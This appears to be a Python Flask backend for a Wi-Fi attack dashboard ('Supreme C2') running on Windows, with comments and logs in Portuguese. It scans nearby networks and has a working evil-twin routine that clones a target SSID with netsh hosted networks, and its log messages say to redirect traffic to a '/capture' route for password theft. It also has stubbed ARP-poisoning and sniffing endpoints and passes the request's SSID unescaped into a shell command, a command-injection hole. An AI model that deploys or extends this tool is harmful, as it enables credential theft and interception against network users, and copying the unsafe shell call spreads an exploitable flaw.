import os
import time
import subprocess
import threading
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify

# Importando Módulos Multiplataforma
from dsi_ai import DSIAI

app = Flask(__name__)

# =========================================================================
# DSI SUPREME C2 - BACKEND WINDOWS (NDIS API)
# Adaptação Especialista de Alto Nível para arquitetura Windows.
# =========================================================================

# Variáveis Globais
BRAIN = DSIAI()
CURRENT_MONITOR_IFACE = None
SCAN_THREAD = None
SCAN_ACTIVE = False
NETWORKS_CACHE = []
SESSION_LOGS = []

# Variáveis Sniffer e Twin (Simuladas/Aguardando Npcap)
SNIFFER_ACTIVE = False
SPOOF_ACTIVE = False
TWIN_ACTIVE = False

def add_log(msg, log_type="info", is_command=False):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "msg": msg, "type": log_type, "cmd": is_command}
    SESSION_LOGS.append(log_entry)
    print(f"[{timestamp}] [{log_type.upper()}] {msg}")

# Base OUI para Inteligência Windows
OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei",
    "00:0C:42": "MikroTik", "00:14:6C": "Netgear", "FC:22:F4": "Zyxel"
}

def identify_vendor(bssid):
    if not bssid: return "Desconhecido"
    prefix = bssid.upper().replace("-", ":")[:8]
    return OUI_DB.get(prefix, "Genérico/Masc")

# Loop de Scanner Passivo (Windows Native API)
def scan_networks_windows_loop():
    global SCAN_ACTIVE, NETWORKS_CACHE
    while SCAN_ACTIVE:
        try:
            # Comando nativo do Windows
            result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"], capture_output=True, text=True, check=True, encoding='cp850', errors='ignore')
            networks = []
            current_network = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith("SSID"):
                    if current_network and 'bssid' in current_network:
                        networks.append(current_network)
                    current_network = {}
                    parts = line.split(":", 1)
                    if len(parts) > 1: current_network['essid'] = parts[1].strip()
                elif "Autentica" in line or "Authentication" in line:
                    current_network['privacy'] = line.split(":", 1)[1].strip()
                elif "BSSID" in line:
                    bssid = line.split(":", 1)[1].strip().upper().replace("-", ":")
                    current_network['bssid'] = bssid
                    current_network['vendor'] = identify_vendor(bssid)
                elif "Sinal" in line or "Signal" in line:
                    val = line.split(":", 1)[1].strip()
                    try:
                        perc = int(val.replace("%", ""))
                        current_network['signal'] = str((perc / 2) - 100)
                    except: current_network['signal'] = "-90"
                elif "Canal" in line or "Channel" in line:
                    current_network['channel'] = line.split(":", 1)[1].strip()
            if current_network and 'bssid' in current_network:
                 networks.append(current_network)
            NETWORKS_CACHE = networks
        except Exception as e:
            pass
        time.sleep(4)

# ==================== ROTAS WEB ====================

@app.route('/')
def dashboard(): return render_template('index.html')

@app.route('/api/logs', methods=['GET'])
def get_logs():
    last_idx = request.args.get('last', default=0, type=int)
    new_logs = SESSION_LOGS[last_idx:]
    return jsonify({"status": "success", "logs": new_logs, "next_idx": len(SESSION_LOGS)})

@app.route('/api/report', methods=['GET'])
def get_report():
    lines = "".join([f"<div style='margin-bottom:5px; color:{'#ff00ff' if l['type']=='cmd' else '#00ccff' if l['type']=='info' else '#ff3300'}'>[{l['time']}] {l['msg']}</div>" for l in SESSION_LOGS])
    return f"<html><body style='background:#050505; color:#00ff00; font-family:monospace; padding:40px;'><h1>RELATÓRIO DSI SUPREMO (WIN EDITION)</h1><hr>{lines}</body></html>"

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, check=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if "Nome" in line or "Name" in line:
                nome = line.split(":")[1].strip()
                interfaces.append(nome)
        return jsonify({"status": "success", "interfaces": interfaces, "os_type": "windows"})
    except:
        return jsonify({"status": "error", "message": "Falha ao listar interfaces no Windows.", "os_type": "windows"})

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    data = request.get_json()
    iface = data.get('interface')
    global CURRENT_MONITOR_IFACE
    CURRENT_MONITOR_IFACE = iface
    add_log(f"Comando recebido: Preparar interface NDIS {iface}.", log_type="cmd", is_command=True)
    add_log("O Windows bloqueia injeção de pacotes. Ativando Modo Híbrido Passivo (Reconhecimento).", log_type="info")
    return jsonify({"status": "success", "monitor_interface": f"{iface} (Passivo)"})

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_ACTIVE, SCAN_THREAD
    if not SCAN_ACTIVE:
        add_log("Acionando Radar Passivo da API Windows.", log_type="cmd", is_command=True)
        SCAN_ACTIVE = True
        SCAN_THREAD = threading.Thread(target=scan_networks_windows_loop, daemon=True)
        SCAN_THREAD.start()
    return jsonify({"status": "success"})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_ACTIVE
    add_log("Radar Passivo desativado.", log_type="info")
    SCAN_ACTIVE = False
    return jsonify({"status": "success"})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    global NETWORKS_CACHE
    sorted_nets = sorted(NETWORKS_CACHE, key=lambda x: float(x.get('signal', -100)), reverse=True)
    return jsonify({"status": "success", "networks": sorted_nets})

def windows_attack_thread(attack_type, bssid, essid):
    add_log(f"INCURSÃO REQUISITADA: {essid}", log_type="cmd", is_command=True)
    
    # IA Brain
    ai_advice = BRAIN.get_strategy(bssid)
    add_log(f"DSI NEURAL NET: {ai_advice}", log_type="info")

    if attack_type in ['wps', 'handshake', 'pmkid', 'vetorx', 'ghost']:
        add_log("BLOQUEIO DO SISTEMA OPERACIONAL: A Microsoft impede a injeção de pacotes via hardware no Windows nativo.", log_type="error")
        add_log("Para ataques ativos de rádio (Deauth, PMKID, WPS), execute o DSI C2 em ambiente Linux/WSL2 com Passthrough USB.", log_type="error")
        BRAIN.learn(bssid, essid, attack_type, False, "Bloqueio OS WinAPI")
        
    elif attack_type == 'eviltwin':
        add_log("Preparando Vetor F: EVIL TWIN (Engenharia Social para Windows)...", log_type="cmd")
        add_log(f"Criando Ponto de Acesso Virtual NDIS com SSID: {essid}")
        
        # Criação de HostedNetwork no Windows (Requer Admin e placa compatível)
        cmd_set = f"netsh wlan set hostednetwork mode=allow ssid=\"{essid}\" key=\"dsi_temp_key\""
        cmd_start = "netsh wlan start hostednetwork"
        
        try:
            subprocess.run(cmd_set, shell=True, capture_output=True)
            res = subprocess.run(cmd_start, shell=True, capture_output=True, text=True)
            if "started" in res.stdout or "iniciada" in res.stdout:
                add_log("SUCESSO: Evil Twin NDIS criado. Uma página falsa precisaria ser roteada para IPs locais.", log_type="info")
                add_log("Para captura completa de senha, redirecione o tráfego HTTP porta 80 para a Rota '/capture' deste servidor C2.")
            else:
                add_log("Falha ao iniciar HostedNetwork. Placa ou Driver Windows não suporta Virtual AP.", log_type="error")
        except Exception as e:
            add_log(f"Erro Fatal HostNetwork: {e}", log_type="error")

    elif attack_type == 'autopilot':
        add_log("Autopiloto Neural ativado para arquitetura NDIS.", log_type="cmd")
        add_log("Tentando Vetor F (Evil Twin) automaticamente devido a restrições do sistema.")
        windows_attack_thread('eviltwin', bssid, essid)

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    data = request.get_json()
    threading.Thread(target=windows_attack_thread, args=(data['attack_type'], data['bssid'], data['essid'])).start()
    return jsonify({"status": "success"})

# Sniffer & MITM Windows (Requer Npcap e Scapy)
@app.route('/api/network/scan', methods=['POST'])
def api_scan_network():
    add_log("Executando varredura ARP na sub-rede (Requer Npcap instalado)...", log_type="cmd", is_command=True)
    try:
        import scapy.all as scapy
        # No Windows o comando ARP pode ser usado como fallback se scapy falhar
        res = subprocess.run("arp -a", shell=True, capture_output=True, text=True)
        devices = []
        for line in res.stdout.split('\n'):
            if "dynamic" in line or "dinâmico" in line:
                parts = line.split()
                if len(parts) >= 2: devices.append({'ip': parts[0], 'mac': parts[1]})
        add_log(f"Scanner concluiu com {len(devices)} dispositivos encontrados no Cache/Rede.")
        return jsonify({"status": "success", "devices": devices})
    except Exception as e:
        add_log(f"Erro no Scanner Windows: {e}", log_type="error")
        return jsonify({"status": "error", "devices": []})

@app.route('/api/sniff/start', methods=['POST'])
def start_sniff():
    global SNIFFER_ACTIVE
    add_log("Tentando iniciar motor de Sniffing e DPI (Npcap mode)...", log_type="cmd", is_command=True)
    SNIFFER_ACTIVE = True
    add_log("Aviso: Sem Npcap, o farejamento é restrito a conexões diretas ao servidor.", log_type="info")
    return jsonify({"status": "success"})

@app.route('/api/sniff/stop', methods=['POST'])
def stop_sniff():
    global SNIFFER_ACTIVE; SNIFFER_ACTIVE = False
    return jsonify({"status": "success"})

@app.route('/api/mitm/start', methods=['POST'])
def start_mitm():
    global SPOOF_ACTIVE
    data = request.get_json()
    add_log(f"Iniciando Envenenamento ARP contra IP: {data.get('target_ip')}", log_type="cmd", is_command=True)
    SPOOF_ACTIVE = True
    add_log("Atenção: IP Routing no Windows deve estar ativado (EnableIPRouting no Regedit) para a internet do alvo não cair.", log_type="info")
    return jsonify({"status": "success"})

@app.route('/api/mitm/stop', methods=['POST'])
def stop_mitm():
    global SPOOF_ACTIVE; SPOOF_ACTIVE = False
    return jsonify({"status": "success"})

@app.route('/api/restore', methods=['POST'])
def restore():
    global SCAN_ACTIVE
    SCAN_ACTIVE = False
    add_log("Desarmando ambiente virtual.", log_type="cmd", is_command=True)
    subprocess.run("netsh wlan stop hostednetwork", shell=True, capture_output=True)
    return jsonify({"status": "success"})

@app.route('/api/fix/wifi6', methods=['POST'])
def fix_wifi6():
    add_log("O Gerenciamento de Drivers no Windows é automatizado pelo SO. Acesse o Gerenciador de Dispositivos.", log_type="info")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    print("\n" + "="*50)
    print(" >>> SUPREME C2 SERVER (WINDOWS BACKEND) <<< ")
    print(" 1. Acesse: http://localhost:5000")
    print(" 2. Mantenha esta janela CMD aberta.")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
